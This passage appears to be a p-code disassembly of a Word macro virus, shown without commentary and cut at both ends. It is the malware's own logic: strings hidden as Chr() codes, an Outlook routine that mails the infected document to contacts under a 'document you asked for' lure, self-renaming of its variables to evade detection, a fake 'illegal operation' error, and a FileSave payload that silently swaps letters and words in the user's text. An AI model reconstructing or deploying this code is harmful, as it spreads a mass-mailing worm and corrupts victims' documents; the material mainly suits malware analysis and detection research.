' 	EndForVariable 
' 	NextVar 
' Line #51:
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0046 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld N842 
' 	MemSt Subject 
' Line #52:
' 	LitDI2 0x0048 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0048 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld N842 
' 	MemSt Body 
' Line #53:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld N842 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #54:
' 	Ld N842 
' 	ArgsMemCall Send 0x0000 
' Line #55:
' 	LitStr 0x0000 ""
' 	St F120 
' Line #56:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' 	Ld B864 
' 	ArgsMemCall Logoff 0x0000 
' Line #58:
' 	Ld Q43 
' 	MemLd Application 
' 	ArgsMemCall Quit 0x0000 
' Line #59:
' 	LitNothing 
' 	St Q43 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	Ld C625 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld D778 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #63:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #64:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	EndSub 
' Line #68:
' Line #69:
' 	QuoteRem 0x0000 0x0010 "Sub ToolsMacro()"
' Line #70:
' 	QuoteRem 0x0000 0x0004 "Q183"
' Line #71:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #72:
' Line #73:
' 	QuoteRem 0x0000 0x0010 "Sub ViewVBCode()"
' Line #74:
' 	QuoteRem 0x0000 0x0004 "Q183"
' Line #75:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #76:
' Line #77:
' 	QuoteRem 0x0000 0x0013 "Sub FileTemplates()"
' Line #78:
' 	QuoteRem 0x0000 0x0004 "Q183"
' Line #79:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #80:
' Line #81:
' 	FuncDefn (Private Sub K44())
' Line #82:
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St msg 
' Line #83:
' 	Ld msg 
' 	Ld vbCritical 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0057 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0003 
' Line #84:
' 	EndSub 
' Line #85:
' Line #86:
' 	FuncDefn (Private Sub Q183())
' Line #87:
' 	OnError (Resume Next) 
' Line #88:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #89:
' 	Dim 
' 	LitDI2 0x0000 
' 	LitDI2 0x0018 
' 	VarDefn V733 (As String)
' Line #90:
' 	LitStr 0x0004 "M457"
' 	LitDI2 0x0000 
' 	ArgsSt V733 0x0001 
' Line #91:
' 	LitStr 0x0004 "C731"
' 	LitDI2 0x0001 
' 	ArgsSt V733 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "R879"
' 	LitDI2 0x0002 
' 	ArgsSt V733 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "A828"
' 	LitDI2 0x0003 
' 	ArgsSt V733 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "J447"
' 	LitDI2 0x0004 
' 	ArgsSt V733 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "D186"
' 	LitDI2 0x0005 
' 	ArgsSt V733 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "H865"
' 	LitDI2 0x0006 
' 	ArgsSt V733 0x0001 
' Line #92:
' 	LitStr 0x0004 "K766"
' 	LitDI2 0x0007 
' 	ArgsSt V733 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "F421"
' 	LitDI2 0x0008 
' 	ArgsSt V733 0x0001 
' 	BoS 0x0000 
' 	BoS 0x0000 
' 	LitStr 0x0004 "D778"
' 	LitDI2 0x0009 
' 	ArgsSt V733 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "C625"
' 	LitDI2 0x000A 
' 	ArgsSt V733 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "R445"
' 	LitDI2 0x000B 
' 	ArgsSt V733 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "P103"
' 	LitDI2 0x000C 
' 	ArgsSt V733 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "L17"
' 	LitDI2 0x000D 
' 	ArgsSt V733 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "V733"
' 	LitDI2 0x000E 
' 	ArgsSt V733 0x0001 
' Line #93:
' 	LitStr 0x0003 "R39"
' 	LitDI2 0x000F 
' 	ArgsSt V733 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "Q43"
' 	LitDI2 0x0010 
' 	ArgsSt V733 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "B864"
' 	LitDI2 0x0011 
' 	ArgsSt V733 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "N842"
' 	LitDI2 0x0012 
' 	ArgsSt V733 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "V422"
' 	LitDI2 0x0013 
' 	ArgsSt V733 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "F120"
' 	LitDI2 0x0014 
' 	ArgsSt V733 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "N233"
' 	LitDI2 0x0015 
' 	ArgsSt V733 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "Q183"
' 	LitDI2 0x0016 
' 	ArgsSt V733 0x0001 
' Line #94:
' 	LitStr 0x0004 "D673"
' 	LitDI2 0x0017 
' 	ArgsSt V733 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "K44"
' 	LitDI2 0x0018 
' 	ArgsSt V733 0x0001 
' Line #95:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0018 
' 	For 
' Line #96:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Ld Rnd 
' 	LitDI2 0x03E8 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St a1 
' Line #97:
' 	Ld a1 
' 	Ld x 
' 	ArgsLd V733 0x0001 
' 	ArgsCall (Call) P103_D186 0x0002 
' Line #98:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #99:
' 	EndSub 
' Line #100:
' Line #101:
' 	FuncDefn (Private Sub P103_D186(L17, C731 As String))
' Line #102:
' 	OnError (Resume Next) 
' Line #103:
' 	Dim 
' 	VarDefn R879 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn A828 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn J447 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn N233 (As Long)
' Line #104:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #105:
' 	LitDI2 0x0001 
' 	St R879 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St A828 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St J447 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St N233 
' Line #106:
' 	Ld C731 
' 	Ld R879 
' 	Ld A828 
' 	Ld J447 
' 	Ld N233 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #107:
' 	Ld R879 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St strline 
' Line #108:
' 	Ld strline 
' 	Ld A828 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld L17 
' 	Concat 
' 	Ld strline 
' 	Ld N233 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St strline 
' Line #109:
' 	Ld R879 
' 	Ld strline 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #110:
' 	Ld J447 
' 	LitDI2 0x0001 
' 	Add 
' 	St R879 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St A828 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St DD2134 
' Line #111:
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St N233 
' Line #112:
' 	Loop 
' Line #113:
' 	EndWith 
' Line #114:
' 	EndSub 
' Line #115:
' Line #116:
' 	FuncDefn (Sub FileSave())
' Line #117:
' 	OnError (Resume Next) 
' Line #118:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #119:
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	MemLd Count 
' 	LitDI2 0x0005 
' 	Le 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #120:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	Set _B_var_K44 
' Line #121:
' 	StartWithExpr 
' 	Ld _B_var_K44 
' 	MemLd Find 
' 	With 
' Line #122:
' 	ArgsMemCallWith ClearFormatting 0x0000 
' Line #123:
' 	MemLdWith Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #124:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #125:
' 	LitStr 0x0001 "."
' 	ParamNamed FindText 
' 	LitStr 0x0001 ","
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	ArgsMemCallWith Execute 0x0003 
' Line #126:
' 	LitStr 0x0001 "a"
' 	ParamNamed FindText 
' 	LitStr 0x0001 "e"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	ArgsMemCallWith Execute 0x0003 
' Line #127:
' 	LitStr 0x0003 "and"
' 	ParamNamed FindText 
' 	LitStr 0x0003 "not"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	ArgsMemCallWith Execute 0x0003 
' Line #128:
' 	EndWith 
' Line #129:
' 	Ld _B_var_SetRange 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St msg 
' Line #130:
' 	Ld msg 
' 	Ld _B_var_SetRange 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St msg 
' Line #131:
' 	Ld msg 
' 	Ld _B_var_SetRange 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St msg 
' Line #132:
' 	Ld msg 
